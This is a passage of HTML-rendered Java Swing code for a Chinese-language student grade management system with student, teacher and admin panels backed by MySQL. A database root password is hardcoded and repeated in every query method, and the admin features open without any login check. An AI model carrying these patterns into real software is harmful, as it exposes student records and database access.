JFrame(&quot;教师功能&quot;);</span><br><span class="line">        teacherFrame.setSize(600, 400);</span><br><span class="line">        teacherFrame.add(new TeacherPanel());</span><br><span class="line">        teacherFrame.setLocationRelativeTo(null);</span><br><span class="line">        teacherFrame.setVisible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void showAdminFeatures(String adminId, String password) &#123;</span><br><span class="line">        // 此处可以添加管理员验证逻辑</span><br><span class="line">        JFrame adminFrame = new JFrame(&quot;管理员功能&quot;);</span><br><span class="line">        adminFrame.setSize(600, 400);</span><br><span class="line">        adminFrame.add(new AdminPanel());</span><br><span class="line">        adminFrame.setLocationRelativeTo(null);</span><br><span class="line">        adminFrame.setVisible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    interface LoginCallback &#123;</span><br><span class="line">        void showFeatures(String id, String password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// 学生功能面板</span><br><span class="line">class StudentPanel extends JPanel &#123;</span><br><span class="line">    private String studentId;</span><br><span class="line"></span><br><span class="line">    public StudentPanel(String studentId) &#123;</span><br><span class="line">        this.studentId = studentId;</span><br><span class="line">        setLayout(new BorderLayout());  // 使用 BorderLayout 布局</span><br><span class="line"></span><br><span class="line">        // 1. 学生信息区顶部标题</span><br><span class="line">        JPanel topPanel = new JPanel();</span><br><span class="line">        JLabel titleLabel = new JLabel(&quot;学生管理功能面板&quot;, JLabel.CENTER);</span><br><span class="line">        titleLabel.setFont(new Font(&quot;Serif&quot;, Font.BOLD, 20));</span><br><span class="line">        topPanel.add(titleLabel);</span><br><span class="line">        add(topPanel, BorderLayout.NORTH);</span><br><span class="line"></span><br><span class="line">        // 2. 添加学生头像或其他图片</span><br><span class="line">        ImageIcon studentImageIcon = new ImageIcon(&quot;C:\\Users\\ASUS\\Desktop\\微信图片_20241031111338.jpg&quot;);</span><br><span class="line">        Image studentImage = studentImageIcon.getImage().getScaledInstance(100, 100, Image.SCALE_SMOOTH);</span><br><span class="line">        JLabel studentImageLabel = new JLabel(new ImageIcon(studentImage));</span><br><span class="line">        JPanel imagePanel = new JPanel();  // 创建一个单独的面板来显示图片</span><br><span class="line">        imagePanel.add(studentImageLabel);</span><br><span class="line">        imagePanel.setBorder(BorderFactory.createLineBorder(Color.BLACK));  // 添加边框</span><br><span class="line"></span><br><span class="line">        // 3. 功能按钮面板</span><br><span class="line">        JPanel buttonPanel = new JPanel(new GridLayout(3, 1, 10, 10));  // 3行1列的布局</span><br><span class="line">        JButton btnViewGrades = createStyledButton(&quot;查询成绩&quot;);</span><br><span class="line">        JButton btnViewProfile = createStyledButton(&quot;查看个人资料&quot;);</span><br><span class="line">        JButton btnViewCourses = createStyledButton(&quot;查看课程信息&quot;);</span><br><span class="line"></span><br><span class="line">        // 按钮事件绑定</span><br><span class="line">        btnViewGrades.addActionListener(e -&gt; queryGrades());</span><br><span class="line">        btnViewProfile.addActionListener(e -&gt; viewProfile());</span><br><span class="line">        btnViewCourses.addActionListener(e -&gt; viewCourses());</span><br><span class="line"></span><br><span class="line">        // 添加按钮到按钮面板</span><br><span class="line">        buttonPanel.add(btnViewGrades);</span><br><span class="line">        buttonPanel.add(btnViewProfile);</span><br><span class="line">        buttonPanel.add(btnViewCourses);</span><br><span class="line"></span><br><span class="line">        // 4. 底部版权信息</span><br><span class="line">        JPanel bottomPanel = new JPanel();</span><br><span class="line">        bottomPanel.setBackground(new Color(72, 61, 139));</span><br><span class="line">        JLabel bottomLabel = new JLabel(&quot;版权所有 © 2024 学生管理系统&quot;);</span><br><span class="line">        bottomLabel.setForeground(Color.WHITE);</span><br><span class="line">        bottomPanel.add(bottomLabel);</span><br><span class="line"></span><br><span class="line">        // 将图片面板、按钮面板和版权信息加入到主面板</span><br><span class="line">        add(imagePanel, BorderLayout.WEST);  // 把图片放在左侧</span><br><span class="line">        add(buttonPanel, BorderLayout.CENTER);  // 把按钮放在中间</span><br><span class="line">        add(bottomPanel, BorderLayout.SOUTH);  // 把版权信息放在底部</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private JButton createStyledButton(String text) &#123;</span><br><span class="line">        JButton button = new JButton(text);</span><br><span class="line">        button.setFont(new Font(&quot;Serif&quot;, Font.PLAIN, 18));  // 使用Serif字体，字号18</span><br><span class="line">        button.setFocusPainted(false);  // 不显示按钮的焦点框</span><br><span class="line">        button.setPreferredSize(new Dimension(200, 60)); // 设置按钮的大小</span><br><span class="line">        button.setForeground(Color.BLACK);  // 文字颜色为黑色</span><br><span class="line">        button.setBackground(Color.WHITE);  // 背景为白色</span><br><span class="line">        button.setBorder(BorderFactory.createLineBorder(Color.BLACK));  // 边框颜色为黑色</span><br><span class="line">        return button;</span><br><span class="line">    &#125;</span><br><span class="line">    // 查询成绩的方法</span><br><span class="line">    private void queryGrades() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;,</span><br><span class="line">                    &quot;1405269390a&quot;);</span><br><span class="line">                 PreparedStatement stmt = conn.prepareStatement(&quot;SELECT * FROM studentgrade WHERE stuid2 = ?&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                stmt.setString(1, studentId);</span><br><span class="line">                ResultSet rs = stmt.executeQuery();</span><br><span class="line">                StringBuilder grades = new StringBuilder(&quot;成绩查询:\n&quot;);</span><br><span class="line"></span><br><span class="line">                while (rs.next()) &#123;</span><br><span class="line">                    grades.append(rs.getString(&quot;name&quot;)).append(&quot;\n&quot;)</span><br><span class="line">                            .append(&quot;高数：&quot;).append(rs.getInt(&quot;math&quot;)).append(&quot;，&quot;)</span><br><span class="line">                            .append(&quot;马原：&quot;).append(rs.getInt(&quot;MaYuan&quot;)).append(&quot;；&quot;)</span><br><span class="line">                            .append(&quot;英语：&quot;).append(rs.getInt(&quot;English&quot;)).append(&quot;，&quot;)</span><br><span class="line">                            .append(&quot;线性代数：&quot;).append(rs.getInt(&quot;linemath&quot;)).append(&quot;\n&quot;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                JOptionPane.showMessageDialog(this, grades.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;JDBC 驱动未找到: &quot; + e.getMessage());</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void viewProfile() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 加载数据库驱动</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line"></span><br><span class="line">            // 建立连接（根据实际情况修改数据库连接信息）</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;, // 数据库连接</span><br><span class="line">                    &quot;root&quot;,    // 用户名</span><br><span class="line">                    &quot;1405269390a&quot;)) &#123;  // 密码</span><br><span class="line"></span><br><span class="line">                // SQL 查询：根据 studentId 查询该学生的个人信息</span><br><span class="line">                String query = &quot;SELECT stuid1, name, telenumber, qqmail, classnumber FROM student WHERE stuid1 = ?&quot;;</span><br><span class="line">                try (PreparedStatement stmt = conn.prepareStatement(query)) &#123;</span><br><span class="line">                    stmt.setString(1, studentId);  // 设置查询条件为学生ID</span><br><span class="line"></span><br><span class="line">                    // 执行查询并获取结果</span><br><span class="line">                    ResultSet rs = stmt.executeQuery();</span><br><span class="line"></span><br><span class="line">                    if (rs.next()) &#123;</span><br><span class="line">                        // 获取查询结果</span><br><span class="line">                        String stuid = rs.getString(&quot;stuid1&quot;);</span><br><span class="line">                        String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                        String telenumber = rs.getString(&quot;telenumber&quot;);</span><br><span class="line">                        String qqmail = rs.getString(&quot;qqmail&quot;);</span><br><span class="line">                        String classnumber = rs.getString(&quot;classnumber&quot;);</span><br><span class="line"></span><br><span class="line">                        // 构建学生个人资料字符串</span><br><span class="line">                        String studentProfile = &quot;学生姓名: &quot; + name + &quot;\n&quot; +</span><br><span class="line">                                &quot;学号: &quot; + stuid + &quot;\n&quot; +</span><br><span class="line">                                &quot;电话: &quot; + telenumber + &quot;\n&quot; +</span><br><span class="line">                                &quot;QQ邮箱: &quot; + qqmail + &quot;\n&quot; +</span><br><span class="line">                                &quot;班级号: &quot; + classnumber;</span><br><span class="line"></span><br><span class="line">                        // 显示学生资料</span><br><span class="line">                        JOptionPane.showMessageDialog(this, studentProfile, &quot;个人资料&quot;, JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        // 如果未找到该学生的信息</span><br><span class="line">                        JOptionPane.showMessageDialog(this, &quot;未找到该学生的个人信息。&quot;, &quot;错误&quot;, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;JDBC 驱动未找到: &quot; + e.getMessage(), &quot;错误&quot;, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage(), &quot;错误&quot;, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 查看课程信息</span><br><span class="line">    private void viewCourses() &#123;</span><br><span class="line">        // 这里可以添加逻辑查询学生的课程信息</span><br><span class="line">        String courses = &quot;已选课程:\n1. 高等数学\n2. 线性代数\n3. 英语\n4. 马原&quot;;</span><br><span class="line">        JOptionPane.showMessageDialog(this, courses, &quot;课程信息&quot;, JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TeacherPanel extends JPanel &#123;</span><br><span class="line"></span><br><span class="line">    public TeacherPanel() &#123;</span><br><span class="line">        setLayout(new BorderLayout());</span><br><span class="line"></span><br><span class="line">        // 1. 教师功能区顶部标题</span><br><span class="line">        JPanel topPanel = new JPanel();</span><br><span class="line">        JLabel titleLabel = new JLabel(&quot;教师管理功能界面&quot;, JLabel.CENTER);</span><br><span class="line">        titleLabel.setFont(new Font(&quot;Serif&quot;, Font.BOLD, 20));</span><br><span class="line">        topPanel.add(titleLabel);</span><br><span class="line">        add(topPanel, BorderLayout.NORTH);</span><br><span class="line"></span><br><span class="line">        // 2. 创建功能按钮面板</span><br><span class="line">        JPanel buttonPanel = new JPanel(new GridLayout(3, 2, 20, 20));  // 按钮布局：3行2列</span><br><span class="line"></span><br><span class="line">        JButton btnEnterGrades = createStyledButton(&quot;录入成绩&quot;);</span><br><span class="line">        JButton btnModifyGrades = createStyledButton(&quot;修改成绩&quot;);</span><br><span class="line">        JButton btnAnalyzeGrades = createStyledButton(&quot;成绩统计分析&quot;);</span><br><span class="line">        JButton btnViewGrades = createStyledButton(&quot;查看成绩&quot;);</span><br><span class="line">        JButton btnDeleteGrades = createStyledButton(&quot;删除成绩&quot;);</span><br><span class="line">        JButton btnExportGrades = createStyledButton(&quot;导出成绩&quot;);</span><br><span class="line"></span><br><span class="line">        // 按钮事件绑定</span><br><span class="line">        btnEnterGrades.addActionListener(e -&gt; enterGrades());</span><br><span class="line">        btnModifyGrades.addActionListener(e -&gt; modifyGrades());</span><br><span class="line">        btnAnalyzeGrades.addActionListener(e -&gt; analyzeGrades());</span><br><span class="line">        btnViewGrades.addActionListener(e -&gt; viewGrades());</span><br><span class="line">        btnDeleteGrades.addActionListener(e -&gt; deleteGrades());</span><br><span class="line">        btnExportGrades.addActionListener(e -&gt; exportGrades());</span><br><span class="line"></span><br><span class="line">        buttonPanel.add(btnEnterGrades);</span><br><span class="line">        buttonPanel.add(btnModifyGrades);</span><br><span class="line">        buttonPanel.add(btnAnalyzeGrades);</span><br><span class="line">        buttonPanel.add(btnViewGrades);</span><br><span class="line">        buttonPanel.add(btnDeleteGrades);</span><br><span class="line">        buttonPanel.add(btnExportGrades);</span><br><span class="line"></span><br><span class="line">        add(buttonPanel, BorderLayout.CENTER);</span><br><span class="line"></span><br><span class="line">        // 3. 底部版权信息</span><br><span class="line">        JPanel bottomPanel = new JPanel();</span><br><span class="line">        bottomPanel.setBackground(new Color(72, 61, 139));</span><br><span class="line">        JLabel bottomLabel = new JLabel(&quot;版权所有 © 2024 教师管理系统&quot;);</span><br><span class="line">        bottomLabel.setForeground(Color.WHITE);</span><br><span class="line">        bottomPanel.add(bottomLabel);</span><br><span class="line">        add(bottomPanel, BorderLayout.SOUTH);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private JButton createStyledButton(String text) &#123;</span><br><span class="line">        JButton button = new JButton(text);</span><br><span class="line">        button.setFont(new Font(&quot;Serif&quot;, Font.PLAIN, 18));  // 使用Serif字体，字号18</span><br><span class="line">        button.setFocusPainted(false);  // 不显示按钮的焦点框</span><br><span class="line">        button.setPreferredSize(new Dimension(200, 60)); // 设置按钮的大小</span><br><span class="line">        button.setForeground(Color.BLACK);  // 文字颜色为黑色</span><br><span class="line">        button.setBackground(Color.WHITE);  // 背景为白色</span><br><span class="line">        button.setBorder(BorderFactory.createLineBorder(Color.BLACK));  // 边框颜色为黑色</span><br><span class="line">        return button;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 录入成绩功能</span><br><span class="line">            private void enterGrades() &#123;</span><br><span class="line">                JTextField studentIdField = new JTextField(15);</span><br><span class="line">                JTextField mathField = new JTextField(15);</span><br><span class="line">                JTextField maYuanField = new JTextField(15);</span><br><span class="line">                JTextField englishField = new JTextField(15);</span><br><span class="line">                JTextField lineMathField = new JTextField(15);</span><br><span class="line"></span><br><span class="line">                JPanel panel = new JPanel(new GridLayout(0, 1));</span><br><span class="line">                panel.add(new JLabel(&quot;学生ID:&quot;));</span><br><span class="line">                panel.add(studentIdField);</span><br><span class="line">                panel.add(new JLabel(&quot;数学成绩:&quot;));</span><br><span class="line">                panel.add(mathField);</span><br><span class="line">                panel.add(new JLabel(&quot;MaYuan成绩:&quot;));</span><br><span class="line">                panel.add(maYuanField);</span><br><span class="line">                panel.add(new JLabel(&quot;英语成绩:&quot;));</span><br><span class="line">                panel.add(englishField);</span><br><span class="line">                panel.add(new JLabel(&quot;线性代数成绩:&quot;));</span><br><span class="line">                panel.add(lineMathField);</span><br><span class="line"></span><br><span class="line">                int option = JOptionPane.showConfirmDialog(this, panel, &quot;录入成绩&quot;, JOptionPane.OK_CANCEL_OPTION);</span><br><span class="line">                if (option == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">                    String studentId = studentIdField.getText();</span><br><span class="line">                    int mathScore = Integer.parseInt(mathField.getText());</span><br><span class="line">                    int maYuanScore = Integer.parseInt(maYuanField.getText());</span><br><span class="line">                    int englishScore = Integer.parseInt(englishField.getText());</span><br><span class="line">                    int lineMathScore = Integer.parseInt(lineMathField.getText());</span><br><span class="line"></span><br><span class="line">                    saveGrades(studentId, mathScore, maYuanScore, englishScore, lineMathScore);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 保存成绩到数据库</span><br><span class="line">            private void saveGrades(String studentId, int mathScore, int maYuanScore, int englishScore, int lineMathScore) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                    try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                            &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                            &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                         PreparedStatement stmt = conn.prepareStatement(&quot;INSERT INTO studentgrade (stuid2, math, MaYuan, English, linemath) VALUES (?, ?, ?, ?, ?)&quot;)) &#123;</span><br><span class="line">                        stmt.setString(1, studentId);</span><br><span class="line">                        stmt.setInt(2, mathScore);</span><br><span class="line">                        stmt.setInt(3, maYuanScore);</span><br><span class="line">                        stmt.setInt(4, englishScore);</span><br><span class="line">                        stmt.setInt(5, lineMathScore);</span><br><span class="line">                        stmt.executeUpdate();</span><br><span class="line">                        JOptionPane.showMessageDialog(this, &quot;成绩录入成功!&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 查看成绩</span><br><span class="line">            private void viewGrades() &#123;</span><br><span class="line">                String studentId = JOptionPane.showInputDialog(this, &quot;请输入学生ID:&quot;);</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                    try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                            &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                            &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                         PreparedStatement stmt = conn.prepareStatement(&quot;SELECT * FROM studentgrade WHERE stuid2 = ?&quot;)) &#123;</span><br><span class="line">                        stmt.setString(1, studentId);</span><br><span class="line">                        ResultSet rs = stmt.executeQuery();</span><br><span class="line">                        if (rs.next()) &#123;</span><br><span class="line">                            String result = String.format(&quot;学生ID: %s\n数学: %d\n马原: %d\n英语: %d\n线性代数: %d&quot;,</span><br><span class="line">                                    rs.getString(&quot;stuid2&quot;), rs.getInt(&quot;math&quot;), rs.getInt(&quot;MaYuan&quot;),</span><br><span class="line">                                    rs.getInt(&quot;English&quot;), rs.getInt(&quot;linemath&quot;));</span><br><span class="line">                            JOptionPane.showMessageDialog(this, result);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;未找到学生ID!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 修改成绩</span><br><span class="line">            private void modifyGrades() &#123;</span><br><span class="line">                String studentId = JOptionPane.showInputDialog(this, &quot;请输入学生ID:&quot;);</span><br><span class="line">                JTextField newMathField = new JTextField(15);</span><br><span class="line">                JTextField newMaYuanField = new JTextField(15);</span><br><span class="line">                JTextField newEnglishField = new JTextField(15);</span><br><span class="line">                JTextField newlineField = new JTextField(15);</span><br><span class="line"></span><br><span class="line">                JPanel panel = new JPanel(new GridLayout(0, 1));</span><br><span class="line">                panel.add(new JLabel(&quot;新数学成绩:&quot;));</span><br><span class="line">                panel.add(newMathField);</span><br><span class="line">                panel.add(new JLabel(&quot;新马原成绩:&quot;));</span><br><span class="line">                panel.add(newMaYuanField);</span><br><span class="line">                panel.add(new JLabel(&quot;新英语成绩:&quot;));</span><br><span class="line">                panel.add(newEnglishField);</span><br><span class="line">                panel.add(new JLabel(&quot;新线性代数成绩:&quot;));</span><br><span class="line">                panel.add(newlineField);</span><br><span class="line"></span><br><span class="line">                int option = JOptionPane.showConfirmDialog(this, panel, &quot;修改成绩&quot;, JOptionPane.OK_CANCEL_OPTION);</span><br><span class="line">                if (option == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">                    int newMathScore = Integer.parseInt(newMathField.getText());</span><br><span class="line">                    int newMaYuanScore = Integer.parseInt(newMaYuanField.getText());</span><br><span class="line">                    updateGrades(studentId, newMathScore, newMaYuanScore);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 更新成绩</span><br><span class="line">            private void updateGrades(String studentId, int newMathScore, int newMaYuanScore) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                    try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                            &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                            &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                         PreparedStatement stmt = conn.prepareStatement(&quot;UPDATE studentgrade SET math = ?, MaYuan = ? WHERE stuid2 = ?&quot;)) &#123;</span><br><span class="line">                        stmt.setInt(1, newMathScore);</span><br><span class="line">                        stmt.setInt(2, newMaYuanScore);</span><br><span class="line">                        stmt.setString(3, studentId);</span><br><span class="line">                        int rowsUpdated = stmt.executeUpdate();</span><br><span class="line">                        if (rowsUpdated &gt; 0) &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;成绩修改成功!&quot;);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;未找到对应的学生ID!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 删除成绩</span><br><span class="line">            private void deleteGrades() &#123;</span><br><span class="line">                String studentId = JOptionPane.showInputDialog(this, &quot;请输入学生ID:&quot;);</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                    try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                            &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                            &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                         PreparedStatement stmt = conn.prepareStatement(&quot;DELETE FROM studentgrade WHERE stuid2 = ?&quot;)) &#123;</span><br><span class="line">                        stmt.setString(1, studentId);</span><br><span class="line">                        int rowsDeleted = stmt.executeUpdate();</span><br><span class="line">                        if (rowsDeleted &gt; 0) &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;成绩删除成功!&quot;);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;未找到对应的学生ID!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 导出成绩</span><br><span class="line">            private void exportGrades() &#123;</span><br><span class="line">                JFileChooser fileChooser = new JFileChooser();</span><br><span class="line">                fileChooser.setDialogTitle(&quot;选择导出文件位置&quot;);</span><br><span class="line">                int userChoice = fileChooser.showSaveDialog(this);</span><br><span class="line">                if (userChoice == JFileChooser.APPROVE_OPTION) &#123;</span><br><span class="line">                    File file = fileChooser.getSelectedFile();</span><br><span class="line">                    if (!file.getName().endsWith(&quot;.csv&quot;)) &#123;</span><br><span class="line">                        file = new File(file.getAbsolutePath() + &quot;.csv&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) &#123;</span><br><span class="line">                        writer.write(&quot;学生ID,学生姓名,数学,马原,英语,线性代数\n&quot;);</span><br><span class="line"></span><br><span class="line">                        try &#123;</span><br><span class="line">                            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                                 Statement stmt = conn.createStatement()) &#123;</span><br><span class="line"></span><br><span class="line">                                ResultSet rs = stmt.executeQuery(&quot;SELECT stuid2, name, math, MaYuan, English, linemath FROM studentgrade&quot;);</span><br><span class="line">                                while (rs.next()) &#123;</span><br><span class="line">                                    String stuid2 = rs.getString(&quot;stuid2&quot;);</span><br><span class="line">                                    String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                                    int math = rs.getInt(&quot;math&quot;);</span><br><span class="line">                                    int MaYuan = rs.getInt(&quot;MaYuan&quot;);</span><br><span class="line">                                    int English = rs.getInt(&quot;English&quot;);</span><br><span class="line">                                    int linemath = rs.getInt(&quot;linemath&quot;);</span><br><span class="line"></span><br><span class="line">                                    DecimalFormat df = new DecimalFormat(&quot;#&quot;);</span><br><span class="line">                                    String formattedMath = df.format(math);</span><br><span class="line">                                    String formattedMaYuan = df.format(MaYuan);</span><br><span class="line">                                    String formattedEnglish = df.format(English);</span><br><span class="line">                                    String formattedLinemath = df.format(linemath);</span><br><span class="line"></span><br><span class="line">                                    writer.write(String.format(&quot;%s,%s,%s,%s,%s,%s\n&quot;, stuid2, name, formattedMath, formattedMaYuan, formattedEnglish, formattedLinemath));</span><br><span class="line">                                &#125;</span><br><span class="line">                                JOptionPane.showMessageDialog(this, &quot;成绩导出成功!&quot;);</span><br><span class="line">                            &#125; catch (SQLException e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                                JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;数据库驱动类未找到: &quot; + e.getMessage());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; catch (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        JOptionPane.showMessageDialog(this, &quot;文件写入错误: &quot; + e.getMessage());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 成绩统计分析</span><br><span class="line"></span><br><span class="line">    private void analyzeGrades() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;,</span><br><span class="line">                    &quot;1405269390a&quot;);</span><br><span class="line">                 Statement stmt = conn.createStatement()) &#123;</span><br><span class="line"></span><br><span class="line">                // 查询每门课程的平均分、最高分和最低分</span><br><span class="line">                String query = &quot;SELECT &quot; +</span><br><span class="line">                        &quot;AVG(math) AS avg_math, MAX(math) AS max_math, MIN(math) AS min_math, &quot; +</span><br><span class="line">                        &quot;AVG(MaYuan) AS avg_maYuan, MAX(MaYuan) AS max_maYuan, MIN(MaYuan) AS min_maYuan, &quot; +</span><br><span class="line">                        &quot;AVG(English) AS avg_english, MAX(English) AS max_english, MIN(English) AS min_english, &quot; +</span><br><span class="line">                        &quot;AVG(linemath) AS avg_linemath, MAX(linemath) AS max_linemath, MIN(linemath) AS min_linemath &quot; +</span><br><span class="line">                        &quot;FROM studentgrade&quot;;</span><br><span class="line"></span><br><span class="line">                ResultSet rs = stmt.executeQuery(query);</span><br><span class="line">                if (rs.next()) &#123;</span><br><span class="line">                    // 显示成绩信息</span><br><span class="line">                    String message = String.format(</span><br><span class="line">                            &quot;数学：平均分: %.2f, 最高分: %d, 最低分: %d\n&quot; +</span><br><span class="line">                                    &quot;马原：平均分: %.2f, 最高分: %d, 最低分: %d\n&quot; +</span><br><span class="line">                                    &quot;英语：平均分: %.2f, 最高分: %d, 最低分: %d\n&quot; +</span><br><span class="line">                                    &quot;线性代数：平均分: %.2f, 最高分: %d, 最低分: %d&quot;,</span><br><span class="line">                            rs.getDouble(&quot;avg_math&quot;), rs.getInt(&quot;max_math&quot;), rs.getInt(&quot;min_math&quot;),</span><br><span class="line">                            rs.getDouble(&quot;avg_maYuan&quot;), rs.getInt(&quot;max_maYuan&quot;), rs.getInt(&quot;min_maYuan&quot;),</span><br><span class="line">                            rs.getDouble(&quot;avg_english&quot;), rs.getInt(&quot;max_english&quot;), rs.getInt(&quot;min_english&quot;),</span><br><span class="line">                            rs.getDouble(&quot;avg_linemath&quot;), rs.getInt(&quot;max_linemath&quot;), rs.getInt(&quot;min_linemath&quot;)</span><br><span class="line">                    );</span><br><span class="line"></span><br><span class="line">                    JOptionPane.showMessageDialog(this, message);</span><br><span class="line"></span><br><span class="line">                    // 询问用户是否生成图表</span><br><span class="line">                    int response = 